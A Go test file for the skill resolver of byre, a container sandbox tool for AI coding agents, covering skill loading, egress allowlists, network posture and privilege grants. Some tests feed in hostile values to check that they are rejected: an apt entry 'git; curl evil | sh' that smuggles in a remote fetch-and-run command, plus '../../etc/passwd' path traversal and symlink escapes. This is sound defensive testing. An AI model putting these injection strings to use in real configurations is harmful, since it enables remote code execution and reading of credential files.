package skills

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/pjlsergeant/byre/internal/builtins"
	"github.com/pjlsergeant/byre/internal/config"
	"github.com/pjlsergeant/byre/internal/packages"
)

// testHome is a BYRE_HOME-shaped temp dir with an empty skills/ tree.
func testHome(t *testing.T) string {
	t.Helper()
	home := t.TempDir()
	if err := os.MkdirAll(filepath.Join(home, "skills"), 0o755); err != nil {
		t.Fatal(err)
	}
	return home
}

// catFor builds a local-only catalog for home (no bundled FS).
func catFor(t *testing.T, home string) *packages.Catalog {
	t.Helper()
	cat, err := packages.LoadCatalog(home, nil, "0.2.0")
	if err != nil {
		t.Fatal(err)
	}
	return cat
}

// writeSkill creates home/skills/<name>/skill.toml (+ optional extra files).
func writeSkill(t *testing.T, home, name, toml string, files map[string]string) {
	t.Helper()
	dir := filepath.Join(home, "skills", name)
	if err := os.MkdirAll(dir, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, "skill.toml"), []byte(toml), 0o644); err != nil {
		t.Fatal(err)
	}
	for fn, content := range files {
		path := filepath.Join(dir, fn)
		if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(path, []byte(content), 0o644); err != nil {
			t.Fatal(err)
		}
	}
}

const sampleSkill = `
[build]
apt = ["ripgrep"]
dockerfile = ["RUN echo sample"]

[runtime]
env = { SAMPLE = "1" }
caps = ["SYS_PTRACE"]

[context]
text = "sample context"
`

const fakeAgentSkill = `
[build]
npm_global = ["@fake/agent-cli"]

[agent]
command = "fake-agent --yolo"
state = ".fake"

[context]
text = "agent context"

[[volumes]]
name = ".fake"
role = "state"
target = "/home/dev/.fake"
`

func TestResolveSampleAndAgentSkills(t *testing.T) {
	dir := testHome(t)
	writeSkill(t, dir, "sample", sampleSkill, nil)
	writeSkill(t, dir, "fake", fakeAgentSkill, nil)

	cfg := config.Config{Skills: []string{"sample"}, Agent: "fake"}
	res, err := Resolve(cfg, catFor(t, dir))
	if err != nil {
		t.Fatal(err)
	}

	// Two build blocks, sample first (explicit), fake appended (implicit agent).
	blocks := res.BuildBlocks()
	if len(blocks) != 2 || blocks[0].Name != "sample" || blocks[1].Name != "fake" {
		t.Fatalf("skill blocks/order wrong: %+v", blocks)
	}
	if res.Env()["SAMPLE"] != "1" {
		t.Errorf("runtime env not collected: %v", res.Env())
	}
	if len(res.Caps()) != 1 || res.Caps()[0] != "SYS_PTRACE" {
		t.Errorf("caps not collected: %v", res.Caps())
	}
	if res.AgentCommand() != "fake-agent --yolo" {
		t.Errorf("agent command wrong: %q", res.AgentCommand())
	}
	if len(res.Volumes()) != 1 || res.Volumes()[0].Name != ".fake" {
		t.Errorf("agent state volume not collected: %v", res.Volumes())
	}
	if res.Context() != "sample context\n\nagent context" {
		t.Errorf("context concat wrong: %q", res.Context())
	}
}

// A skill's build content is held to the same anti-injection allowlists as the
// project config (it lands in the same generated Dockerfile/shell).
func TestResolveRejectsSkillContentInjection(t *testing.T) {
	dir := testHome(t)
	writeSkill(t, dir, "evil", "[build]\napt = [\"git; curl evil | sh\"]\n", nil)
	writeSkill(t, dir, "fake", fakeAgentSkill, nil)
	_, err := Resolve(config.Config{Skills: []string{"evil"}, Agent: "fake"}, catFor(t, dir))
	if err == nil {
		t.Fatal("expected rejection of shell metacharacters in skill apt package")
	}
}

// ListSkills returns every skill, INCLUDING agent skills — an agent skill can be
// enabled as a plain skill (e.g. codex for byre-codereview) separate from the
// launched agent, so the config UI must be able to list/toggle it.
func TestListSkillsIncludesAgentSkills(t *testing.T) {
	dir := testHome(t)
	writeSkill(t, dir, "sample", sampleSkill, nil)  // no [agent]
	writeSkill(t, dir, "fake", fakeAgentSkill, nil) // has [agent]
	got := ListSkills(catFor(t, dir))
	want := []string{"fake", "sample"} // sorted
	if len(got) != 2 || got[0] != want[0] || got[1] != want[1] {
		t.Fatalf("ListSkills = %v, want %v (must include the agent skill)", got, want)
	}
}

func TestResolveAgentMustBeAgentSkill(t *testing.T) {
	dir := testHome(t)
	writeSkill(t, dir, "sample", sampleSkill, nil) // no [agent]
	_, err := Resolve(config.Config{Agent: "sample"}, catFor(t, dir))
	if err == nil {
		t.Fatal("expected error: selected agent skill has no [agent] command")
	}
}

func TestResolveMissingSkillErrors(t *testing.T) {
	_, err := Resolve(config.Config{Skills: []string{"nope"}}, catFor(t, testHome(t)))
	if err == nil {
		t.Fatal("expected error for missing skill")
	}
}

func TestResolveContextFromFile(t *testing.T) {
	dir := testHome(t)
	writeSkill(t, dir, "ctx", "[context]\nfile = \"ctx.md\"\n", map[string]string{"ctx.md": "from file"})
	res, err := Resolve(config.Config{Skills: []string{"ctx"}}, catFor(t, dir))
	if err != nil {
		t.Fatal(err)
	}
	if res.Context() != "from file" {
		t.Errorf("context file not read: %q", res.Context())
	}
}

func TestDescriptionParsedAndListed(t *testing.T) {
	dir := testHome(t)
	writeSkill(t, dir, "described", "description = \"One line about it.\"\n[build]\napt = [\"jq\"]\n", nil)
	writeSkill(t, dir, "bare", "[build]\napt = [\"jq\"]\n", nil)
	sk, err := Load(catFor(t, dir), "described")
	if err != nil {
		t.Fatalf("Load: %v", err)
	}
	if sk.File.Description != "One line about it." {
		t.Fatalf("Description = %q", sk.File.Description)
	}
	descs := DescribeSkills(catFor(t, dir))
	if descs["described"] != "One line about it." {
		t.Fatalf("DescribeSkills[described] = %q", descs["described"])
	}
	// A skill without a description is legal and simply absent from the map.
	if d, ok := descs["bare"]; ok {
		t.Fatalf("bare skill unexpectedly described: %q", d)
	}
}

func TestLoadRejectsUnknownKey(t *testing.T) {
	dir := testHome(t)
	writeSkill(t, dir, "typo", "[agent]\ncommmand = \"x\"\n", nil) // misspelled command
	if _, err := Load(catFor(t, dir), "typo"); err == nil {
		t.Fatal("expected unknown-key error for typo'd skill.toml")
	}
}

func TestResolveContextFileTraversalRejected(t *testing.T) {
	dir := testHome(t)
	writeSkill(t, dir, "evil", "[context]\nfile = \"../../etc/passwd\"\n", nil)
	if _, err := Resolve(config.Config{Skills: []string{"evil"}}, catFor(t, dir)); err == nil {
		t.Fatal("expected rejection of path-traversal context file")
	}
}

func TestResolveContextSymlinkEscapeRejected(t *testing.T) {
	dir := testHome(t)
	outside := filepath.Join(t.TempDir(), "secret")
	if err := os.WriteFile(outside, []byte("secret"), 0o644); err != nil {
		t.Fatal(err)
	}
	writeSkill(t, dir, "evil", "[context]\nfile = \"link\"\n", nil)
	// symlink inside the skill dir pointing outside the bundle
	if err := os.Symlink(outside, filepath.Join(dir, "skills", "evil", "link")); err != nil {
		t.Fatal(err)
	}
	if _, err := Resolve(config.Config{Skills: []string{"evil"}}, catFor(t, dir)); err == nil {
		t.Fatal("expected rejection of symlink escaping the skill dir")
	}
}

func TestResolveAgentStateMustBeContributed(t *testing.T) {
	dir := testHome(t)
	// declares state ".claude" but contributes no such state volume
	writeSkill(t, dir, "claudish", "[agent]\ncommand = \"claude\"\nstate = \".claude\"\n", nil)
	if _, err := Resolve(config.Config{Agent: "claudish"}, catFor(t, dir)); err == nil {
		t.Fatal("expected error: agent.state names no contributed state volume")
	}
}

// agentWithPrefs is an agent skill that declares a curated prefs block.
const agentWithPrefs = `
[agent]
command = "fake-agent"
state = ".fake"

[agent.prefs]
from = "~/.fake"
files = ["keybindings.json", "themes"]

[[volumes]]
name = ".fake"
role = "state"
target = "/home/dev/.fake"
`

func TestResolvePrefsCollected(t *testing.T) {
	dir := testHome(t)
	writeSkill(t, dir, "fake", agentWithPrefs, nil)
	res, err := Resolve(config.Config{Agent: "fake"}, catFor(t, dir))
	if err != nil {
		t.Fatal(err)
	}
	if res.AgentPrefs() == nil {
		t.Fatal("expected AgentPrefs to be set")
	}
	if res.AgentPrefs().From != "~/.fake" || len(res.AgentPrefs().Files) != 2 {
		t.Fatalf("prefs not parsed: %+v", res.AgentPrefs())
	}
}

func TestResolvePrefsRequireState(t *testing.T) {
	dir := testHome(t)
	// prefs but no [agent].state -> nowhere to seed -> error.
	writeSkill(t, dir, "fake", "[agent]\ncommand = \"x\"\n[agent.prefs]\nfrom = \"~/.fake\"\nfiles = [\"a\"]\n", nil)
	if _, err := Resolve(config.Config{Agent: "fake"}, catFor(t, dir)); err == nil {
		t.Fatal("expected error: prefs require a state volume")
	}
}

func TestResolvePrefsRejectsEscapingFile(t *testing.T) {
	dir := t.TempDir()
	toml := "[agent]\ncommand = \"x\"\nstate = \".fake\"\n[agent.prefs]\nfrom = \"~/.fake\"\nfiles = [\"../../etc/passwd\"]\n" +
		"[[volumes]]\nname = \".fake\"\nrole = \"state\"\ntarget = \"/home/dev/.fake\"\n"
	writeSkill(t, dir, "fake", toml, nil)
	if _, err := Resolve(config.Config{Agent: "fake"}, catFor(t, dir)); err == nil {
		t.Fatal("expected error: prefs file escapes from-dir")
	}
}

func TestResolvePrefsRejectsWholeDir(t *testing.T) {
	dir := testHome(t)
	// files = ["."] would copy the entire from-dir (incl. secret-bearing files);
	// must be rejected so curation can't be bypassed.
	for _, bad := range []string{".", "./", "x/.."} {
		toml := "[agent]\ncommand = \"x\"\nstate = \".fake\"\n[agent.prefs]\nfrom = \"~/.fake\"\nfiles = [\"" + bad + "\"]\n" +
			"[[volumes]]\nname = \".fake\"\nrole = \"state\"\ntarget = \"/home/dev/.fake\"\n"
		writeSkill(t, dir, "fake", toml, nil)
		if _, err := Resolve(config.Config{Agent: "fake"}, catFor(t, dir)); err == nil {
			t.Fatalf("expected rejection of prefs file %q (whole-dir copy)", bad)
		}
	}
}

func TestResolveNoAgent(t *testing.T) {
	dir := testHome(t)
	writeSkill(t, dir, "sample", sampleSkill, nil)
	res, err := Resolve(config.Config{Skills: []string{"sample"}}, catFor(t, dir))
	if err != nil {
		t.Fatal(err)
	}
	if res.AgentCommand() != "" {
		t.Errorf("no agent should mean empty AgentCommand: %q", res.AgentCommand())
	}
}

func TestResolveSkillFiles(t *testing.T) {
	dir := t.TempDir()
	const toml = `
[build]
files = { "review.sh" = "/usr/local/bin/byre-review", "lib/helper.sh" = "/opt/helper.sh" }
`
	writeSkill(t, dir, "tools", toml, map[string]string{
		"review.sh":     "#!/bin/sh\necho review\n",
		"lib/helper.sh": "echo help\n",
	})
	res, err := Resolve(config.Config{Skills: []string{"tools"}}, catFor(t, dir))
	if err != nil {
		t.Fatal(err)
	}
	files := res.BuildBlocks()[0].Files
	if len(files) != 2 {
		t.Fatalf("want 2 skill files, got %d: %+v", len(files), files)
	}
	// Sorted by source for determinism: "lib/helper.sh" < "review.sh".
	if files[0].Rel != "lib/helper.sh" || files[0].Dest != "/opt/helper.sh" {
		t.Errorf("first file wrong: %+v", files[0])
	}
	if files[1].Rel != "review.sh" || files[1].Dest != "/usr/local/bin/byre-review" {
		t.Errorf("second file wrong: %+v", files[1])
	}
	if res.BuildBlocks()[0].Name != "tools" {
		t.Errorf("skill name not recorded: %+v", res.BuildBlocks()[0])
	}
}

func TestResolveSkillFilesRejectsRelativeDest(t *testing.T) {
	dir := testHome(t)
	writeSkill(t, dir, "bad", "[build]\nfiles = { \"x.sh\" = \"relative/dest\" }\n",
		map[string]string{"x.sh": "x\n"})
	if _, err := Resolve(config.Config{Skills: []string{"bad"}}, catFor(t, dir)); err == nil {
		t.Fatal("expected rejection of non-absolute file destination")
	}
}

func TestResolveSkillFilesRejectsEscape(t *testing.T) {
	dir := testHome(t)
	writeSkill(t, dir, "bad", "[build]\nfiles = { \"../escape.sh\" = \"/x.sh\" }\n", nil)
	if _, err := Resolve(config.Config{Skills: []string{"bad"}}, catFor(t, dir)); err == nil {
		t.Fatal("expected rejection of source escaping the skill dir")
	}
}

func TestResolveAgentContextTarget(t *testing.T) {
	dir := t.TempDir()
	const toml = `
[agent]
command = "fake --go"
state = ".fake"
context_target = "/home/dev/.fake/MEM.md"
[context]
text = "workflow rules"
[[volumes]]
name = ".fake"
role = "state"
target = "/home/dev/.fake"
`
	writeSkill(t, dir, "fake", toml, nil)
	res, err := Resolve(config.Config{Agent: "fake"}, catFor(t, dir))
	if err != nil {
		t.Fatal(err)
	}
	if res.AgentContextTarget() != "/home/dev/.fake/MEM.md" {
		t.Errorf("context target not resolved: %q", res.AgentContextTarget())
	}
	if res.Context() != "workflow rules" {
		t.Errorf("context not resolved: %q", res.Context())
	}
}

func TestResolveAgentContextTargetMustBeAbsolute(t *testing.T) {
	dir := t.TempDir()
	const toml = `
[agent]
command = "fake --go"
state = ".fake"
context_target = "rel/MEM.md"
[[volumes]]
name = ".fake"
role = "state"
target = "/home/dev/.fake"
`
	writeSkill(t, dir, "fake", toml, nil)
	if _, err := Resolve(config.Config{Agent: "fake"}, catFor(t, dir)); err == nil {
		t.Fatal("expected rejection of non-absolute context_target")
	}
}

func TestResolveRejectsUnsafeSkillName(t *testing.T) {
	dir := t.TempDir()
	if _, err := Resolve(config.Config{Skills: []string{"../evil"}}, catFor(t, dir)); err == nil {
		t.Fatal("expected rejection of skill name with path separator")
	}
}

func TestResolveContextTargetMustBeWithinHome(t *testing.T) {
	dir := t.TempDir()
	const toml = `
[agent]
command = "fake --go"
state = ".fake"
context_target = "/etc/passwd"
[[volumes]]
name = ".fake"
role = "state"
target = "/home/dev/.fake"
`
	writeSkill(t, dir, "fake", toml, nil)
	if _, err := Resolve(config.Config{Agent: "fake"}, catFor(t, dir)); err == nil {
		t.Fatal("expected rejection of context_target outside /home/dev")
	}
}

func TestResolveContextTargetRejectsHomeItself(t *testing.T) {
	dir := t.TempDir()
	const toml = `
[agent]
command = "fake --go"
state = ".fake"
context_target = "/home/dev"
[[volumes]]
name = ".fake"
role = "state"
target = "/home/dev/.fake"
`
	writeSkill(t, dir, "fake", toml, nil)
	if _, err := Resolve(config.Config{Agent: "fake"}, catFor(t, dir)); err == nil {
		t.Fatal("expected rejection of context_target == /home/dev (not a file)")
	}
}

func TestResolveRejectsCrossSkillEnvConflict(t *testing.T) {
	dir := testHome(t)
	writeSkill(t, dir, "a", "[runtime]\nenv = { EDITOR = \"vim\" }\n", nil)
	writeSkill(t, dir, "b", "[runtime]\nenv = { EDITOR = \"emacs\" }\n", nil)
	_, err := Resolve(config.Config{Skills: []string{"a", "b"}}, catFor(t, dir))
	if err == nil {
		t.Fatal("expected an error for a cross-skill env conflict")
	}
	// The error must name both skills and the key, so the fix is obvious.
	for _, want := range []string{"a", "b", "EDITOR"} {
		if !strings.Contains(err.Error(), want) {
			t.Errorf("conflict error should mention %q: %v", want, err)
		}
	}
}

func TestResolveAllowsIdenticalEnvAcrossSkills(t *testing.T) {
	dir := testHome(t)
	writeSkill(t, dir, "a", "[runtime]\nenv = { EDITOR = \"vim\" }\n", nil)
	writeSkill(t, dir, "b", "[runtime]\nenv = { EDITOR = \"vim\" }\n", nil)
	res, err := Resolve(config.Config{Skills: []string{"a", "b"}}, catFor(t, dir))
	if err != nil {
		t.Fatalf("identical values are order-independent and must be allowed: %v", err)
	}
	if res.Env()["EDITOR"] != "vim" {
		t.Errorf("env not merged: %v", res.Env())
	}
}

func TestGrantsAttributeRunArgs(t *testing.T) {
	dir := testHome(t)
	writeSkill(t, dir, "danger", "[runtime]\nrun_args = [\"--privileged\"]\n", nil)
	writeSkill(t, dir, "plain", "[build]\napt = [\"jq\"]\n", nil)
	res, err := Resolve(config.Config{Skills: []string{"danger", "plain"}}, catFor(t, dir))
	if err != nil {
		t.Fatal(err)
	}
	grants := res.Grants()
	if len(grants) != 1 || grants[0].Skill != "danger" {
		t.Fatalf("run_args alone must produce an attributed grant: %+v", grants)
	}
	if len(grants[0].RunArgs) != 1 || grants[0].RunArgs[0] != "--privileged" {
		t.Errorf("grant should carry the run args: %+v", grants[0])
	}
}

func TestResolveNetworkPostureAndNetnsInit(t *testing.T) {
	dir := testHome(t)
	writeSkill(t, dir, "fw", "[runtime]\nnetwork_posture = \"deny-by-default\"\nnetns_init = \"/usr/local/bin/byre-firewall\"\n", nil)
	res, err := Resolve(config.Config{Skills: []string{"fw"}}, catFor(t, dir))
	if err != nil {
		t.Fatal(err)
	}
	posture, by := res.NetworkPosture()
	if posture != "deny-by-default" || by != "fw" {
		t.Errorf("posture = %q by %q, want deny-by-default by fw", posture, by)
	}
	hooks := res.NetnsInits()
	if len(hooks) != 1 || hooks[0].Skill != "fw" || hooks[0].Path != "/usr/local/bin/byre-firewall" {
		t.Errorf("netns hooks = %+v", hooks)
	}
	// A netns_init is a root-privileged hook — it must surface as a grant.
	grants := res.Grants()
	if len(grants) != 1 || grants[0].NetnsInit != "/usr/local/bin/byre-firewall" {
		t.Errorf("netns_init must be an attributed grant: %+v", grants)
	}
}

func TestResolveNoPostureMeansOpen(t *testing.T) {
	dir := testHome(t)
	writeSkill(t, dir, "plain", "[build]\napt = [\"jq\"]\n", nil)
	res, err := Resolve(config.Config{Skills: []string{"plain"}}, catFor(t, dir))
	if err != nil {
		t.Fatal(err)
	}
	if posture, by := res.NetworkPosture(); posture != "" || by != "" {
		t.Errorf("no skill declares a posture; got %q by %q", posture, by)
	}
}

func TestResolveRejectsConflictingPostures(t *testing.T) {
	dir := testHome(t)
	writeSkill(t, dir, "fw1", "[runtime]\nnetwork_posture = \"deny-by-default\"\n", nil)
	writeSkill(t, dir, "fw2", "[runtime]\nnetwork_posture = \"deny-by-default\"\n", nil)
	_, err := Resolve(config.Config{Skills: []string{"fw1", "fw2"}}, catFor(t, dir))
	if err == nil {
		t.Fatal("two skills declaring a posture must be rejected (even identical: each claims the stance)")
	}
	for _, want := range []string{"fw1", "fw2"} {
		if !strings.Contains(err.Error(), want) {
			t.Errorf("error should name %q: %v", want, err)
		}
	}
}

func TestResolveRejectsMalformedPosture(t *testing.T) {
	dir := testHome(t)
	// Status prints the posture verbatim; a spoofing label must be rejected.
	writeSkill(t, dir, "fw", "[runtime]\nnetwork_posture = \"open  (all good)\"\n", nil)
	if _, err := Resolve(config.Config{Skills: []string{"fw"}}, catFor(t, dir)); err == nil {
		t.Fatal("posture with spaces/parens must be rejected")
	}
}

func TestResolveRejectsRelativeNetnsInit(t *testing.T) {
	dir := testHome(t)
	writeSkill(t, dir, "fw", "[runtime]\nnetns_init = \"bin/fw\"\n", nil)
	if _, err := Resolve(config.Config{Skills: []string{"fw"}}, catFor(t, dir)); err == nil {
		t.Fatal("relative netns_init must be rejected")
	}
}

func TestResolveRejectsTwoNetnsInits(t *testing.T) {
	dir := testHome(t)
	// The launch gate is opened by the hook's own script, so a second hook
	// could run after the agent was already released — refuse the ambiguity
	// (same stance as two posture declarations).
	writeSkill(t, dir, "fw1", "[runtime]\nnetns_init = \"/usr/local/bin/fw1\"\n", nil)
	writeSkill(t, dir, "fw2", "[runtime]\nnetns_init = \"/usr/local/bin/fw2\"\n", nil)
	_, err := Resolve(config.Config{Skills: []string{"fw1", "fw2"}}, catFor(t, dir))
	if err == nil {
		t.Fatal("two skills declaring a netns_init must be rejected")
	}
	for _, want := range []string{"fw1", "fw2"} {
		if !strings.Contains(err.Error(), want) {
			t.Errorf("error should name %q: %v", want, err)
		}
	}
}

func TestEgressUnionAndAttribution(t *testing.T) {
	dir := testHome(t)
	writeSkill(t, dir, "claude", "[runtime]\negress = [\"api.anthropic.com\", \"claude.ai\"]\n", nil)
	writeSkill(t, dir, "fw", "[runtime]\nnetwork_posture = \"deny-by-default\"\negress = [\"github.com\", \"deb.debian.org:80\", \"api.anthropic.com\"]\n", nil)
	res, err := Resolve(config.Config{Skills: []string{"claude", "fw"}}, catFor(t, dir))
	if err != nil {
		t.Fatal(err)
	}
	// Union: normalized host:port, deduped (api.anthropic.com appears in both),
	// port defaulted to 443, explicit :80 preserved, first-seen order.
	got := res.Egress()
	want := []string{"api.anthropic.com:443", "claude.ai:443", "github.com:443", "deb.debian.org:80"}
	if strings.Join(got, ",") != strings.Join(want, ",") {
		t.Fatalf("Egress() = %v, want %v", got, want)
	}
	// Attribution keeps the per-skill duplicate (both declared anthropic) so
	// status can show who asked for what.
	allows := res.EgressAllows()
	var fromClaude, fromFw int
	for _, a := range allows {
		switch a.Skill {
		case "claude":
			fromClaude++
		case "fw":
			fromFw++
		}
	}
	if fromClaude != 2 || fromFw != 3 {
		t.Errorf("attribution counts: claude=%d fw=%d; allows=%+v", fromClaude, fromFw, allows)
	}
}

func TestEgressRejectsMalformed(t *testing.T) {
	for _, bad := range []string{"api.anthropic.com:99999", "has space.com", "host:notaport:443", "bad;host"} {
		dir := t.TempDir()
		writeSkill(t, dir, "fw", "[runtime]\negress = [\""+bad+"\"]\n", nil)
		if _, err := Resolve(config.Config{Skills: []string{"fw"}}, catFor(t, dir)); err == nil {
			t.Errorf("egress %q must be rejected", bad)
		}
	}
}

func TestEgressPortDefaultsTo443(t *testing.T) {
	if h, p, err := parseEgress("api.anthropic.com"); err != nil || h != "api.anthropic.com" || p != 443 {
		t.Fatalf("parseEgress default = (%q,%d,%v), want (api.anthropic.com,443,nil)", h, p, err)
	}
	if h, p, err := parseEgress("deb.debian.org:80"); err != nil || h != "deb.debian.org" || p != 80 {
		t.Fatalf("parseEgress explicit = (%q,%d,%v)", h, p, err)
	}
}

// SharedAuthCompanion maps an agent to the skill VOUCHING itself ready as
// that agent's shared-auth companion (shared_auth_for). No declaration — a
// broken or gate-pending companion — means no onboarding offer.
func TestSharedAuthCompanion(t *testing.T) {
	dir := testHome(t)
	writeSkill(t, dir, "claude", "[agent]\ncommand = \"claude\"\nstate = \"s\"\n\n[[volumes]]\nname = \"s\"\nrole = \"state\"\ntarget = \"/home/dev/.claude\"\n", nil)
	writeSkill(t, dir, "claude-shared-auth", "shared_auth_for = \"claude\"\n", nil)
	writeSkill(t, dir, "grok-shared-auth", "description = \"RETIRED — no shared_auth_for, so never offered\"\n", nil)

	if got := SharedAuthCompanion(catFor(t, dir), "claude"); got != "claude-shared-auth" {
		t.Fatalf("SharedAuthCompanion(claude) = %q, want claude-shared-auth", got)
	}
	if got := SharedAuthCompanion(catFor(t, dir), "grok"); got != "" {
		t.Fatalf("an undeclared companion must not be offered, got %q", got)
	}
	if got := SharedAuthCompanion(catFor(t, dir), ""); got != "" {
		t.Fatalf("no agent, no companion, got %q", got)
	}
}

// The builtin declarations are load-bearing: claude/codex offer at onboarding;
// gemini (OAuth gate-pending) and grok (retired) deliberately must NOT.
func TestBuiltinSharedAuthDeclarations(t *testing.T) {
	home := t.TempDir()
	cat, err := packages.LoadCatalog(home, builtins.FS(), "0.2.0")
	if err != nil {
		t.Fatal(err)
	}
	for agent, want := range map[string]string{
		"claude": "claude-shared-auth",
		"codex":  "codex-shared-auth",
		"gemini": "", // OAuth gate-pending (no shared_auth_for)
		"grok":   "", // retired (see grok-shared-auth/skill.toml)
	} {
		if got := SharedAuthCompanion(cat, agent); got != want {
			t.Errorf("SharedAuthCompanion(%s) = %q, want %q", agent, got, want)
		}
	}
}

// Two skills claiming the same agent is refused (no offer), not resolved by
// sort order — a hand-dropped near-namesake must not shadow the builtin.
func TestSharedAuthCompanionRefusesAmbiguity(t *testing.T) {
	dir := testHome(t)
	writeSkill(t, dir, "aa-auth", "shared_auth_for = \"claude\"\n", nil)
	writeSkill(t, dir, "claude-shared-auth", "shared_auth_for = \"claude\"\n", nil)
	if got := SharedAuthCompanion(catFor(t, dir), "claude"); got != "" {
		t.Fatalf("two declarers must yield no companion, got %q", got)
	}
}

func TestResolveSockGroupsAndContainment(t *testing.T) {
	dir := testHome(t)
	writeSkill(t, dir, "dh", `
[runtime]
mounts = [{ host = "/var/run/docker.sock", target = "/var/run/docker.sock", mode = "rw" }]
sock_groups = ["/var/run/docker.sock"]
containment = "docker-host opens a containment hole -- skim docs/docker-host.md"
egress = []
`, nil)
	res, err := Resolve(config.Config{Skills: []string{"dh"}}, catFor(t, dir))
	if err != nil {
		t.Fatal(err)
	}
	sgs := res.SockGroups()
	if len(sgs) != 1 || sgs[0].Skill != "dh" || sgs[0].Path != "/var/run/docker.sock" {
		t.Fatalf("SockGroups = %+v", sgs)
	}
	cs := res.Containments()
	if len(cs) != 1 || cs[0].Skill != "dh" || !strings.Contains(cs[0].Text, "containment hole") {
		t.Fatalf("Containments = %+v", cs)
	}
	grants := res.Grants()
	if len(grants) != 1 || len(grants[0].SockGroups) != 1 || grants[0].SockGroups[0] != "/var/run/docker.sock" {
		t.Fatalf("Grant.SockGroups = %+v", grants)
	}
	if len(grants[0].Mounts) != 1 {
		t.Fatalf("expected mount on grant: %+v", grants[0])
	}
}

func TestResolveMultiContainment(t *testing.T) {
	dir := testHome(t)
	writeSkill(t, dir, "a", `[runtime]
containment = "hole A"
`, nil)
	writeSkill(t, dir, "b", `[runtime]
containment = "hole B"
`, nil)
	res, err := Resolve(config.Config{Skills: []string{"a", "b"}}, catFor(t, dir))
	if err != nil {
		t.Fatal(err)
	}
	cs := res.Containments()
	if len(cs) != 2 || cs[0].Text != "hole A" || cs[1].Text != "hole B" {
		t.Fatalf("multi-declarer must render all in enable order: %+v", cs)
	}
}

func TestResolveRejectsSockGroupsWithoutMount(t *testing.T) {
	dir := testHome(t)
	writeSkill(t, dir, "dh", `[runtime]
sock_groups = ["/var/run/docker.sock"]
`, nil)
	if _, err := Resolve(config.Config{Skills: []string{"dh"}}, catFor(t, dir)); err == nil {
		t.Fatal("sock_groups without matching mount target must be rejected")
	}
}

func TestResolveRejectsRelativeSockGroup(t *testing.T) {
	dir := testHome(t)
	// sock_groups path is relative; rejected regardless of mounts.
	writeSkill(t, dir, "dh", `[runtime]
mounts = [{ host = "/h", target = "/t", mode = "rw" }]
sock_groups = ["relative"]
`, nil)
	if _, err := Resolve(config.Config{Skills: []string{"dh"}}, catFor(t, dir)); err == nil {
		t.Fatal("relative sock_groups path must be rejected")
	}
}

func TestResolveRejectsContainmentNewline(t *testing.T) {
	dir := testHome(t)
	// Literal newline inside the TOML string is invalid TOML; use the escaped
	// form so Load succeeds and validateContainment rejects the decoded value.
	writeSkill(t, dir, "dh", "[runtime]\ncontainment = \"hole\\nNetwork: open\"\n", nil)
	if _, err := Resolve(config.Config{Skills: []string{"dh"}}, catFor(t, dir)); err == nil {
		t.Fatal("containment with newline must be rejected")
	}
}

func TestValidateContainmentControlChar(t *testing.T) {
	if err := validateContainment("hole\x01forged"); err == nil {
		t.Fatal("control char must be rejected")
	}
	if err := validateContainment("ok one-liner"); err != nil {
		t.Fatalf("valid containment rejected: %v", err)
	}
}

func TestResolveRejectsContainmentTooLong(t *testing.T) {
	dir := t.TempDir()
	long := strings.Repeat("x", containmentMaxLen+1)
	writeSkill(t, dir, "dh", "[runtime]\ncontainment = \""+long+"\"\n", nil)
	if _, err := Resolve(config.Config{Skills: []string{"dh"}}, catFor(t, dir)); err == nil {
		t.Fatal("overlong containment must be rejected")
	}
}

func TestForkThenResolvePeteClaude(t *testing.T) {
	home := testHome(t)
	// Simulate a fork: local pete/claude with an agent block.
	writeSkill(t, home, "pete/claude", `
[package]
id = "pete/claude"
kind = "skill"

[agent]
command = "claude --yolo"
state = ".claude"

[[volumes]]
name = ".claude"
role = "state"
target = "/home/dev/.claude"
`, nil)
	// Nested path: writeSkill uses home/skills/name — for pete/claude need nested.
	// writeSkill joins home/skills/pete/claude when name has slash... check
	cat := catFor(t, home)
	res, err := Resolve(config.Config{Agent: "pete/claude"}, cat)
	if err != nil {
		t.Fatal(err)
	}
	if res.AgentCommand() == "" {
		t.Fatal("expected agent command")
	}
	if len(res.Names()) != 1 || res.Names()[0] != "pete/claude" {
		t.Fatalf("names = %v", res.Names())
	}
}
